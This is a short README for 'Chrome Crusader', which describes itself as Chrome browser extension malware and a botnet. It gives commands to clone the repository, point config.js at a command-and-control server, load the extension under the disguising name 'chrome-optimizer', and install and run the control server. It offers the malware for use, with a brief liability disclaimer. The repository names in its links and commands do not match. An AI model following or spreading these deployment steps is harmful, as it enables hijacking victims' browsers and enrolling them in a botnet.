[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://github.com/lillypad/chrome-crusader/blob/master/LICENSE)
[![Python 2](https://img.shields.io/badge/Python-2-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)
[![Python 3](https://img.shields.io/badge/Python-3-brightgreen.svg)](https://github.com/lillypad/chrome-crusader/)

# Chrome Crusader

Chrome Crusader is a Google Chrome browser extension malware / botnet.

**NOTE: THIS IS MALWARE USE AT YOUR OWN RISK!**

# Installing Chrome Extension

```bash
git clone https://github.com/lillypad/browser-bandit.git
cd browser-bandit/
nano -w chrome-optimizer/config.js
chrome --load-extension=chrome-optimizer/
```

`config.js` should be setup with the CnC server's IP address and port.

# CnC Server Setup

```bash
cd cnc-server/
sudo python setup.py install
bbserver.py
```

# Disclaimer

By using this free software you indemnify and hold harmless it's creators and understand you are using this at your own risk.
